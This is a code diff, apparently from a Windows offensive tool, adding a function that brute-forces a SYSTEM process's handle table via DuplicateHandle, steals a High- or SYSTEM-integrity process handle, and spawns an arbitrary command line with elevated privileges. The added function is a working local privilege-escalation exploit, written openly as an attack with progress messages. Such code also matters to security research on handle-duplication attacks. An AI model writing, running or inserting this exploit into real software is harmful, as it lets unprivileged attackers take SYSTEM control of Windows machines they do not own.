@@ -93,6 +93,52 @@ DWORD GetTargetIntegrityLevel(DWORD pid) {
 	return GetTargetIntegrityLevel(hProc);
 }
 
+// ExploitDupHandle: given a handle to a SYSTEM process with PROCESS_DUP_HANDLE rights,
+// brute-forces the target's handle table to steal a privileged process handle,
+// then uses CreatePrivProc to spawn commandLine in that elevated context.
+DWORD ExploitDupHandle(HANDLE hProc, LPWSTR commandLine) {
+	// Handle values in Windows are multiples of 4 starting at 4.
+	// SYSTEM processes commonly hold a self-handle and handles to other SYSTEM processes
+	// at low handle values, so 0x1000 covers the vast majority of cases.
+	for (ULONG_PTR handleVal = 4; handleVal < 0x1000; handleVal += 4) {
+		HANDLE hStolen = NULL;
+
+		// Steal the handle at this slot with DUPLICATE_SAME_ACCESS so we get
+		// whatever rights the target already has on that object.
+		if (!DuplicateHandle(hProc, (HANDLE)handleVal, GetCurrentProcess(),
+			&hStolen, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
+			continue;
+		}
+
+		// Filter: is this a process handle?
+		DWORD pid = GetProcessId(hStolen);
+		if (pid == 0) {
+			CloseHandle(hStolen);
+			continue;
+		}
+
+		// Filter: is the target process running at High or SYSTEM integrity?
+		DWORD il = GetTargetIntegrityLevel(pid);
+		if (il < SECURITY_MANDATORY_HIGH_RID && GetLastError() != ERROR_ACCESS_DENIED) {
+			CloseHandle(hStolen);
+			continue;
+		}
+
+		std::cout << "[+] ExploitDupHandle: stolen process handle 0x" << std::hex << handleVal
+			<< " -> PID " << std::dec << pid
+			<< " (IL: 0x" << std::hex << il << "), spawning...\n";
+
+		DWORD privPid = CreatePrivProc(&hStolen, commandLine);
+		CloseHandle(hStolen);
+		if (privPid != 0)
+			return privPid;
+
+		std::cerr << "[-] CreatePrivProc failed for handle 0x" << std::hex << handleVal
+			<< " (error: " << std::dec << GetLastError() << ")\n";
+	}
+	return 0;
+}
+
 wstring GetProcName(DWORD pid)
 {
 	PROCESSENTRY32 processInfo;
